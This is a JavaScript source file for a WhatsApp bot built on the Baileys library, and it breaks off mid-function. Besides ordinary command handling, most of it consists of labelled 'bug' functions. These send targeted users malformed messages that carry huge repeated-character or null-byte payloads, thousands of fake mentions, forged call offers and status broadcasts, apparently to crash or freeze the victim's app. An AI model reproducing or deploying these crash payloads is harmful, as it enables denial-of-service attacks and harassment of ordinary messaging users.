require('./settings');
const fs = require('fs');
const axios = require('axios');
const path = require('path');
const chalk = require("chalk");
const util = require("util");
const crypto = require("crypto");
const moment = require("moment-timezone");
const speed = require('performance-now');     
const FileType = require('file-type');

const {
    spawn, 
    exec,
    execSync 
   } = require('child_process');
const { makeWASocket, makeCacheableSignalKeyStore, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, PHONENUMBER_MCC, AnyMessageContent, useMultiFileAuthState, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header } = require('@whiskeysockets/baileys')

module.exports = sock = async (sock, m, chatUpdate, store) => {
try {
// Message type handlers
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
);
const foto = fs.readFileSync('./DEWAISHERE/who.jpg')   
const mintak = fs.readFileSync('./DEWAISHERE/dewa.jpg') 
const musik = fs.readFileSync('./audio/dewa.mp3') 

const sender = m.key.fromMe
? sock.user.id.split(":")[0] || sock.user.id
: m.key.participant || m.key.remoteJid;

const senderNumber = sender.split('@')[0];
const budy = (typeof m.text === 'string' ? m.text : '');
const prefa = ["", "!", ".", ",", "🐤", "🗿"];
const prefixRegex = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/;
        const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : '/';
        const from = m.key.remoteJid;
        const isGroup = from.endsWith("@g.us");
        const premium = JSON.parse(fs.readFileSync("./lib/Database/premium.json"))
        const owner = JSON.parse(fs.readFileSync("./lib/Database/owner.json"))
        const botNumber = await sock.decodeJid(sock.user.id);
        const isPremium = premium.includes(m.sender)
        const isOwner = owner.includes(m.sender)
        const isCmd = body.startsWith(prefix);
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
        const command2 = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1);
        const pushname = m.pushName || "No Name";
        const isCreator = (m && m.sender && [botNumber, ...owner, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
        const text = q = args.join(" ");
        const quoted = m.quoted ? m.quoted : m;
        const mime = (quoted.msg || quoted).mimetype || '';
        const qmsg = (quoted.msg || quoted);
        const isMedia = /image|video|sticker|audio/.test(mime);

        const groupMetadata = isGroup ? await sock.groupMetadata(m.chat).catch((e) => {}) : "";
        const groupOwner = isGroup ? groupMetadata.owner : "";
        const groupName = m.isGroup ? groupMetadata.subject : "";
        const participants = isGroup ? await groupMetadata.participants : "";
        const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
        const groupMembers = isGroup ? groupMetadata.participants : "";
        const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
        const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
        const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
        const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
        
// My Func
const { pinterest, pinterest2, remini, mediafire, tiktokDl , spotifyDl , searchSpotifyTracks, convertDuration, convertAngka, ytdl, tiktokSearchVideo, delay, text2img, listModels, getModels, listSampler, pickRandom, getJobs, spotifyDown, rsz } = require('./lib/scraper');

const { 
smsg, 
sendGmail, 
formatSize, 
isUrl, 
generateMessageTag, 
getBuffer, 
getSizeMedia, 
runtime, 
fetchJson, 
sleep } = require('./lib/myfunc');

 
  let apiClient;
try {
  const res = await fetch('https://gist.githubusercontent.com/Tama-Ryuichi/572ad67856a67dbae3c37982679153b2/raw/apiClient.json');
  apiClient = await res.text();
} catch (err) {
  console.error("error fetching", err);
  return;
}
async function makeStickerFromUrl(imageUrl, sock, m) {
    try {
        let buffer;
        if (imageUrl.startsWith("data:")) {
            const base64Data = imageUrl.split(",")[1];
            buffer = Buffer.from(base64Data, 'base64');
        } else {
            const response = await axios.get(imageUrl, { responseType: 'arraybuffer' });
            buffer = Buffer.from(response.data, "binary");
        }
        
        const webpBuffer = await sharp(buffer)
            .resize(512, 512, { fit: 'contain', background: { r: 255, g: 255, b: 255, alpha: 0 } })
            .webp({ quality: 70 })
            .toBuffer();
        
        const penis = await addExif(webpBuffer, global.packname, global.author)

        const fileName = getRandomFile(".webp");
        fs.writeFileSync(fileName, webpBuffer);

        await sock.sendMessage(m.chat, {
            sticker: penis,
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: `Sasuke Crash`,
                    body: `Erlangga Developer `,
                    mediaType: 3,
                    renderLargerThumbnail: false,
                    thumbnailUrl: poto, 
                    sourceUrl: `https://t.me/GupongShop `
                }
            }
        }, { quoted: qmime });

        fs.unlinkSync(fileName);
    } catch (error) {
        console.error("Error creating sticker:", error);
        Reply('Terjadi kesalahan saat membuat stiker. Coba lagi nanti.');
    }
}

 async function tiktok2(query) {
  return new Promise(async (resolve, reject) => {
    try {
    const encodedParams = new URLSearchParams();
encodedParams.set('url', query);
encodedParams.set('hd', '1');

      const response = await axios({
        method: 'POST',
        url: 'https://tikwm.com/api/',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'Cookie': 'current_language=en',
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
        },
        data: encodedParams
      });
      const videos = response.data.data;
        const result = {
          title: videos.title,
          cover: videos.cover,
          origin_cover: videos.origin_cover,
          no_watermark: videos.play,
          watermark: videos.wmplay,
          music: videos.music
        };
        resolve(result);
    } catch (error) {
      reject(error);
    }
  });
}
// fungsi waktu real time
const time = moment.tz("Asia/Jakarta").format("HH:mm:ss");

// Cmd in Console
if (isCmd) {
    console.log(`
${chalk.inverse('Dewa & Gupong')}  ${chalk.inverse(` ${new Date().toLocaleString()} `)}

${chalk.magenta.bold('╭─ > From:')}      ${chalk.green.bold(pushname || 'Unknown')} ${chalk.yellow(`(${m.sender})`)}
${chalk.magenta.bold('├─ > In:')}        ${chalk.cyan.bold(m.isGroup ? 'Group Chat' : 'Private Chat')} ${chalk.gray(from)}
${chalk.magenta.bold('╰─ > Message:')}   ${chalk.white.bold(budy || m.mtype)}

${chalk.greenBright.bold('╭────────────────────────────────────────────╮')}
${chalk.greenBright.bold('│          DEWA INVICTUS | © Available          │')}
${chalk.greenBright.bold('╰────────────────────────────────────────────╯')}
    `);
}

///// 𝐅𝐔𝐍𝐂 𝐁𝐔𝐆 /////===
async function WizzEfceh(sock, target) {
const { encodeSignedDeviceIdentity, jidEncode, jidDecode, encodeWAMessage, patchMessageBeforeSending, encodeNewsletterMessage } = require("@whiskeysockets/baileys");
let devices = (
await sock.getUSyncDevices([target], false, false)
).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

await sock.assertSessions(devices)

let xnxx = () => {
let map = {};
return {
mutex(key, fn) {
map[key] ??= { task: Promise.resolve() };
map[key].task = (async prev => {
try { await prev; } catch {}
return fn();
})(map[key].task);
return map[key].task;
}
};
};

let memek = xnxx();
let bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
let porno = sock.createParticipantNodes.bind(sock);
let yntkts = sock.encodeWAMessage?.bind(sock);

sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);
let ywdh = Array.isArray(patched)
? patched
: recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

let { id: meId, lid: meLid } = sock.authState.creds.me;
let omak = meLid ? jidDecode(meLid)?.user : null;
let shouldIncludeDeviceIdentity = false;

let nodes = await Promise.all(ywdh.map(async ({ recipientJid: jid, message: msg }) => {
let { user: targetUser } = jidDecode(jid);
let { user: ownPnUser } = jidDecode(meId);
let isOwnUser = targetUser === ownPnUser || targetUser === omak;
let y = jid === meId || jid === meLid;
if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

let bytes = bokep(yntkts ? yntkts(msg) : encodeWAMessage(msg));

return memek.mutex(jid, async () => {
let { type, ciphertext } = await sock.signalRepository.encryptMessage({ jid, data: bytes });
if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
return {
tag: 'to',
attrs: { jid },
content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }]
};
});
}));

return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
};

let awik = crypto.randomBytes(32);
let awok = Buffer.concat([awik, Buffer.alloc(8, 0x01)]);
let { nodes: destinations, shouldIncludeDeviceIdentity } = await sock.createParticipantNodes(devices, { conversation: "y" }, { count: '0' });

let lemiting = {
tag: "call",
attrs: { to: target, id: sock.generateMessageTag(), from: sock.user.id },
content: [{
tag: "offer",
attrs: {
"call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
"call-creator": sock.user.id
},
content: [
{ tag: "audio", attrs: { enc: "opus", rate: "16000" } },
{ tag: "audio", attrs: { enc: "opus", rate: "8000" } },
{
tag: "video",
attrs: {
orientation: "0",
screen_width: "1920",
screen_height: "1080",
device_orientation: "0",
enc: "vp8",
dec: "vp8"
}
},
{ tag: "net", attrs: { medium: "3" } },
{ tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
{ tag: "encopt", attrs: { keygen: "2" } },
{ tag: "destination", attrs: {}, content: destinations },
...(shouldIncludeDeviceIdentity ? [{
tag: "device-identity",
attrs: {},
content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
}] : [])
]
}]
};
await sock.sendNode(lemiting);
}
//FUNCTION BUG WHATSAPP LU//==
async function occolotopysV3(sock, target, mention = true) {
  let msg = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      contextInfo: {
        mentionedJid: Array.from({ length: 1900 }, () => `1@s.whatsapp.net`)
      },
      body: {
        text: "X",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
        version: 3
      }
    }
  }, {});

  await sock.relayMessage(
    target,
    {
      groupStatusMessageV2: {
        message: msg.message
      }
    },
    mention
      ? { messageId: msg.key.id, participant: { jid: target } }
      : { messageId: msg.key.id }
  );

  console.log(chalk.red(`Succes Sending Bug To ${target}`));
}

async function blankSticker(sock, target) {
    await sock.relayMessage(
        target,
        {
            stickerPackMessage: {
                stickerPackId: "X",
                name:
                    "𝚾 - 𝐀𝐩𝐨𝐥𝐥𝐨 𝐒𝐩𝐚𝐜𝐞   ༘‣" +
                    "؂ن؃؄ٽ؂ن؃".repeat(10000),
                publisher:
                    "𝚾 - 𝐀𝐩𝐨𝐥𝐥𝐨 𝐒𝐩𝐚𝐜𝐞   ༘‣" +
                    "؂ن؃؄ٽ؂ن؃".repeat(10000),

                stickers: [
                    {
                        fileName: "FlMx-HjycYUqguf2rn67DhDY1X5ZIDMaxjTkqVafOt8=.webp",
                        isAnimated: false,
                        emojis: ["🦠"],
                        accessibilityLabel: "dvx",
                        isLottie: true,
                        mimetype: "application/pdf"
                    },
                    {
                        fileName: "KuVCPTiEvFIeCLuxUTgWRHdH7EYWcweh+S4zsrT24ks=.webp",
                        isAnimated: false,
                        emojis: ["🦠"],
                        accessibilityLabel: "dvx",
                        isLottie: true,
                        mimetype: "application/pdf"
                    },
                    {
                        fileName: "wi+jDzUdQGV2tMwtLQBahUdH9U-sw7XR2kCkwGluFvI=.webp",
                        isAnimated: false,
                        emojis: ["🦠"],
                        accessibilityLabel: "dvx",
                        isLottie: true,
                        mimetype: "application/pdf"
                    },
                    {
                        fileName: "jytf9WDV2kDx6xfmDfDuT4cffDW37dKImeOH+ErKhwg=.webp",
                        isAnimated: false,
                        emojis: ["🦠"],
                        accessibilityLabel: "dvx",
                        isLottie: true,
                        mimetype: "application/pdf"
                    },
                    {
                        fileName: "ItSCxOPKKgPIwHqbevA6rzNLzb2j6D3-hhjGLBeYYc4=.webp",
                        isAnimated: false,
                        emojis: ["🦠"],
                        accessibilityLabel: "dvx",
                        isLottie: true,
                        mimetype: "application/pdf"
                    },
                    {
                        fileName: "1EFmHJcqbqLwzwafnUVaMElScurcDiRZGNNugENvaVc=.webp",
                        isAnimated: false,
                        emojis: ["🦠"],
                        accessibilityLabel: "dvx",
                        isLottie: true,
                        mimetype: "application/pdf"
                    },
                    {
                        fileName: "3UCz1GGWlO0r9YRU0d-xR9P39fyqSepkO+uEL5SIfyE=.webp",
                        isAnimated: false,
                        emojis: ["🦠"],
                        accessibilityLabel: "dvx",
                        isLottie: true,
                        mimetype: "application/pdf"
                    },
                    {
                        fileName: "1cOf+Ix7+SG0CO6KPBbBLG0LSm+imCQIbXhxSOYleug=.webp",
                        isAnimated: false,
                        emojis: ["🦠"],
                        accessibilityLabel: "dvx",
                        isLottie: true,
                        mimetype: "application/pdf"
                    },
                    {
                        fileName: "5R74MM0zym77pgodHwhMgAcZRWw8s5nsyhuISaTlb34=.webp",
                        isAnimated: false,
                        emojis: ["🦠"],
                        accessibilityLabel: "dvx",
                        isLottie: true,
                        mimetype: "application/pdf"
                    },
                    {
                        fileName: "3c2l1jjiGLMHtoVeCg048To13QSX49axxzONbo+wo9k=.webp",
                        isAnimated: false,
                        emojis: ["🦠"],
                        accessibilityLabel: "dvx",
                        isLottie: true,
                        mimetype: "application/pdf"
                    }
                ],

                fileLength: "999999",
                fileSha256: "4HrZL3oZ4aeQlBwN9oNxiJprYepIKT7NBpYvnsKdD2s=",
                fileEncSha256: "1ZRiTM82lG+D768YT6gG3bsQCiSoGM8BQo7sHXuXT2k=",
                mediaKey: "X9cUIsOIjj3QivYhEpq4t4Rdhd8EfD5wGoy9TNkk6Nk=",

                directPath:
                    "/v/t62.15575-24/24265020_2042257569614740_7973261755064980747_n.enc?ccb=11-4&oh=01_Q5AaIJUsG86dh1hY3MGntd-PHKhgMr7mFT5j4rOVAAMPyaMk&oe=67EF584B&_nc_sid=5e03e0",

                contextInfo: {},

                packDescription:
                    "𝚾 - 𝐀𝐩𝐨𝐥𝐥𝐨 𝐒𝐩𝐚𝐜𝐞 ༘‣" +
                    "؂ن؃؄ٽ؂ن؃".repeat(10000),

                mediaKeyTimestamp: "1741150286",
                trayIconFileName: "2496ad84-4561-43ca-949e-f644f9ff8bb9.png",

                thumbnailDirectPath:
                    "/v/t62.15575-24/11915026_616501337873956_5353655441955413735_n.enc?ccb=11-4&oh=01_Q5AaIB8lN_sPnKuR7dMPKVEiNRiozSYF7mqzdumTOdLGgBzK&oe=67EF38ED&_nc_sid=5e03e0",

                thumbnailSha256:
                    "R6igHHOD7+oEoXfNXT+5i79ugSRoyiGMI/h8zxH/vcU=",

                thumbnailEncSha256:
                    "xEzAq/JvY6S6q02QECdxOAzTkYmcmIBdHTnJbp3hsF8=",

                thumbnailHeight: 252,
                thumbnailWidth: 252,

                imageDataHash:
                    "ODBkYWY0NjE1NmVlMTY5ODNjMTdlOGE3NTlkNWFkYTRkNTVmNWY0ZThjMTQwNmIyYmI1ZDUyZGYwNGFjZWU4ZQ==",

                stickerPackSize: "999999999",
                stickerPackOrigin: "1"
            }
        }, { participant: { jid: target }});
    }
    
async function IosVisibleExp(sock, target) {
    const TrashIosx =
        ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ " +
        "𑇂𑆵𑆴𑆿";

    await sock.sendMessage(
        target,
        {
            text: "👁‍🗨⃟꙰。⃝𝐀𝐩𝐨𝐥𝐥𝐨 ‌ ‌⃰ ⌁ 𝐅𝐯𝐜𝐤𝐞𝐫.ꪸ⃟‼️ ✩ > https://t.me/xrelly" + TrashIosx + "𑇂𑆵𑆴𑆿".repeat(15000),
            contextInfo: {
                externalAdReply: {
                    title:
                        "({[🧪⃟꙰。⃝𝐀𝐩𝐨𝐥𝐥𝐨 ‌ ‌⃰ ⌁ 𝐅𝐯𝐜𝐤𝐞𝐫.ꪸ⃟‼️✩ ▻ ]})" +
                        "𑇂𑆵𑆴𑆿".repeat(15000),

                    body:
                        `🧪⃟꙰。⌁ ͡ ⃰͜.ꪸꪰ𝘅𝗿𝗹.𝛆𝛘𞥆𝛆 ✩ ▻` +
                        TrashIosx +
                        "𑇂𑆵𑆴𑆿".repeat(15000),

                    previewType: "PHOTO",
                    remoteJid: "X",
                    conversionSource: " X ",
                    conversionData: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                    conversionDelaySeconds: 10,
                    forwardingScore: 9999999,
                    isForwarded: true,

                    quotedAd: {
                        advertiserName: " X ",
                        mediaType: "IMAGE",
                        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                        caption: " X "
                    },

                    placeholderKey: {
                        remoteJid: "0@s.whatsapp.net",
                        fromMe: false,
                        id: "ABCDEF1234567890"
                    },

                    thumbnail: null,
                    sourceUrl: "https://xnxx.com"
                }
            }
        }
    );
}

async function kresjandaotax(sock, target) {
  for (let i = 0; i < 20; i++) {
    let push = [];
    let buttt = [];

    for (let i = 0; i < 20; i++) {
      buttt.push({
        "name": "galaxy_message",
        "buttonParamsJson": JSON.stringify({
          "header": "ꦽ".repeat(10000),
          "body": "ꦽ".repeat(10000),
          "flow_action": "navigate",
          "flow_action_payload": { "screen": "FORM_SCREEN" },
          "flow_cta": "Grattler",
          "flow_id": "1169834181134583",
          "flow_message_version": "3",
          "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
        })
      });
    }

    for (let i = 0; i < 10; i++) {
      push.push({
        "body": {
          "text": "⌭ɪᴍ ʜᴇʀᴇ ʙʀᴏ¿?"
        },
        "header": { 
          "title": "⦸ ʟᴏɴᴛᴇ sᴘᴇᴋ ᴋᴇʀᴀs" + "ꦽ".repeat(50000),
          "hasMediaAttachment": false,
          "videoMessage": {
            "url": "https://mmg.whatsapp.net/v/t62.7161-24/533825502_1245309493950828_6330642868394879586_n.enc?ccb=11-4&oh=01_Q5Aa2QHb3h9aN3faY_F2h3EFoAxMO_uUEi2dufCo-UoaXhSJHw&oe=68CD23AB&_nc_sid=5e03e0&mms3=true",
            "mimetype": "video/mp4",
            "fileSha256": "IL4IFl67c8JnsS1g6M7NqU3ZSzwLBB3838ABvJe4KwM=",
            "fileLength": "9999999999999999",
            "seconds": 9999,
            "mediaKey": "SAlpFAh5sHSHzQmgMGAxHcWJCfZPknhEobkQcYYPwvo=",
            "height": 9999,
            "width": 9999,
            "fileEncSha256": "QxhyjqRGrvLDGhJi2yj69x5AnKXXjeQTY3iH2ZoXFqU=",
            "directPath": "/v/t62.7161-24/533825502_1245309493950828_6330642868394879586_n.enc?ccb=11-4&oh=01_Q5Aa2QHb3h9aN3faY_F2h3EFoAxMO_uUEi2dufCo-UoaXhSJHw&oe=68CD23AB&_nc_sid=5e03e0",
            "mediaKeyTimestamp": "1755691703",
            "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACIASAMBIgACEQEDEQH/xAAuAAADAQEBAAAAAAAAAAAAAAAAAwQCBQEBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAIaZr4ffxlt35+Wxm68MqyQzR1c65OiNLWF2TJHO2GNGAq8BhpcGpiQ65gnDF6Av/8QAJhAAAgIBAwMFAAMAAAAAAAAAAQIAAxESITEEE0EQFCIyURUzQv/aAAgBAQABPwAag5/1EssTAfYZn8jjAxE6mlgPlH6ipPMfrR4EbqHY4gJB43nuCSZqAz4YSpntrIsQEY5iV1JkncQNWrHczuVnwYhpIy2YO2v1IMa8A5aNfgnQuBATccu0Tu0n4naI5tU6kxK6FOdxPbN+bS2nTwQTNDr5ljfpgcg8wZlNrbDEqKBBnmK66s5E7qmWWjPAl135CxJ3PppHbzjxOm/sjM2thmVfUxuZZxLYfT//xAAcEQACAgIDAAAAAAAAAAAAAAAAARARAjESIFH/2gAIAQIBAT8A6Wy2jlNHpjtD1P8A/8QAGREAAwADAAAAAAAAAAAAAAAAAAERICEw/9oACAEDAQE/AIRmycHh/9k=",
            "streamingSidecar": "qe+/0dCuz5ZZeOfP3bRc0luBXRiidztd+ojnn29BR9ikfnrh9KFflzh6aRSpHFLATKZL7lZlBhYU43nherrRJw9WUQNWy74Lnr+HudvvivBHpBAYgvx07rDTRHRZmWx7fb1fD7Mv/VQGKRfD3ScRnIO0Nw/0Jflwbf8QUQE3dBvnJ/FD6In3W9tGSdLEBrwsm1/oSZRl8O3xd6dFTauD0Q4TlHj02/pq6888pzY00LvwB9LFKG7VKeIPNi3Szvd1KbyZ3QHm+9TmTxg2ga4s9U5Q",
            "scanLengths": [
              247,
              201,
              73,
              63
            ],
            "midQualityFileSha256": "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="
          }
        },
        "nativeFlowMessage": {
          "buttons": []
        }
      });
    }

    const carousel = generateWAMessageFromContent(target, {
      "viewOnceMessage": {
        "message": {
          "messageContextInfo": {
            "deviceListMetadata": {},
            "deviceListMetadataVersion": 2
          },
          "interactiveMessage": {
            "body": {
              "text": "⩝ɪᴍ ᴀʟᴏɴᴇ" + "ꦽ".repeat(50000)
            },
            "footer": {
              "text": "∅ ᴅɪʟᴀʀᴀɴɢ ᴋᴇʟᴜᴀʀ"
            },
            "header": {
              "hasMediaAttachment": false
            },
            "carouselMessage": {
              "cards": [
                ...push
              ]
            }
          }
        }
      }
    }, {});

    await sock.relayMessage(target, carousel.message, {
      "messageId": carousel.key.id,
      participant: { jid: target }
    });
  }
}

async function LocaCrashUi2(sock, target) {
console.log(chalk.red(`𝗗𝗲𝘄𝗮 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
  const otaxx = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
  locationMessage: {
          degreesLatitude: 11.11,
          degreesLongitude: -11.11,
          name: "DO YOU KNOW ME?¿ GUPONG" + "ꦽ".repeat(60000),
          url: "https://t.me/GupongShop",
          contextInfo: {
            externalAdReply: {
              quotedAd: {
                advertiserName: "ꦾ".repeat(60000),
                mediaType: "IMAGE",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                caption: "οταϰ ιѕ нєяє"
              },
              placeholderKey: {
                remoteJid: "0@g.us",
                fromMe: true,
                id: "ABCDEF1234567890"
              }
            }
          }
        },
            hasMediaAttachment: true
          },
          body: {
            text: "нαιι ιм οταϰ⸙"
          },
          nativeFlowMessage: {
            messageParamsJson: "{[",
            messageVersion: 3,
            buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },           
                {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                    "icon": "RIVIEW",
                    "flow_cta": "ꦽ".repeat(10000),
                    "flow_message_version": "3"
                })
              },      
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                    "icon": "RIVIEW",
                    "flow_cta": "ꦾ".repeat(10000),
                    "flow_message_version": "3"
                })
              },  
            ]
          }
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, proto.Message.fromObject(otaxx), { userJid: target });
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
  
  await new Promise(r => setTimeout(r, 500));

  await sock.sendMessage(target, {
    delete: {
      fromMe: true,
      remoteJid: target,
      id: msg.key.id
    }
  });
}
    
async function crashGP(target) {
await sock.relayMessage(target, {
  "interactiveMessage": {
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "review_and_pay",
          "buttonParamsJson": `{\"currency\":\"IDR\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":800,\"offset\":100},\"reference_id\":\"4TU82OG2957\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"description\":\"\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"PAYMENT_REQUEST\",\"items\":[{\"retailer_id\":\"custom-item-2c7378a6-1643-4dba-8b2d-23e556a81ad4\",\"name\":\"${'\u0000'.repeat(50000)}\",\"amount\":{\"value\":800,\"offset\":100},\"quantity\":1}]},\"additional_note\":\"xtx\",\"native_payment_methods\":[],\"share_payment_status\":false}`
          }
        ]
      }
    }
  }, {});
}  

async function HyperSixty(target, mention) {
  try {
    const Node = "𑇂𑆵𑆴𑆿";
    const metaNode = [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }];

    const locationMessage = {
      degreesLatitude: -9.09999262999,
      degreesLongitude: 199.99963118999,
      jpegThumbnail: null,
      name: "\u0000" + Node.repeat(15000),
      address: "\u0000" + Node.repeat(10000),
      url: `${Node.repeat(25000)}.com`
    };

    const extendMsg = {
      extendedTextMessage: {
        text: "X",
        matchedText: "",
        description: Node.repeat(25000),
        title: Node.repeat(15000),
        previewType: "NONE",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/OLEoNAWOTCTFRfHQNAMYmMjIUEgAcmFqKiw0xFH//Z",
        thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc",
        thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
        thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
        mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
        mediaKeyTimestamp: "1743101489",
        thumbnailHeight: 641,
        thumbnailWidth: 640,
        inviteLinkGroupTypeV2: "DEFAULT"
      }
    };

    const makeMsg = content =>
      generateWAMessageFromContent(
        target,
        { viewOnceMessage: { message: content } },
        {}
      );

    const msg1 = makeMsg({ locationMessage });
    const msg2 = makeMsg(extendMsg);
    const msg3 = makeMsg({ locationMessage });

    for (const m of [msg1, msg2, msg3]) {
      await sock.relayMessage("status@broadcast", m.message, {
        messageId: m.key.id,
        statusJidList: [target],
        additionalNodes: metaNode
      });
    }

  } catch (e) {
    console.error(e);
  }
}
    
async function Xtended(sock, target) {
         try {
          const locationMessage = {
           degreesLatitude: -9.09999262999,
           degreesLongitude: 199.99963118999,
           jpegThumbnail: null,
           name: "X" + "𑇂𑆵𑆴𑆿".repeat(15000),
           address: "X" + "𑇂𑆵𑆴𑆿".repeat(5000),
           url: `${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
          }
          
          const msg = generateWAMessageFromContent(target, {
                    viewOnceMessage: {
                        message: { locationMessage }
                    }
                }, {});
          
          await sock.relayMessage('status@broadcast', msg.message, {
           messageId: msg.key.id,
           statusJidList: [target],
           additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
             tag: 'mentioned_users',
             attrs: {},
             content: [{
              tag: 'to',
              attrs: { jid: target },
              content: undefined
             }]
            }]
           }]
          });
         } catch (err) {
          console.error(err);
         }
        };
        
async function glorymessage(target, cta = true) {
  let msg = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      contextInfo: {
        mentionedJid: Array.from({ length: 2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`),
        isForwarded: true,
        forwardingScore: 7205,
        expiration: 0
      },
      body: { text: "Xata", format: "DEFAULT" },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
        version: 3
      }
    }
  }, {});

  await sock.relayMessage(target, {
    groupStatusMessageV2: { message: msg.message }
  }, cta ? { messageId: msg.key.id, participant: { jid: target } } : { messageId: msg.key.id });

  let msg2 = generateWAMessageFromContent(target, {
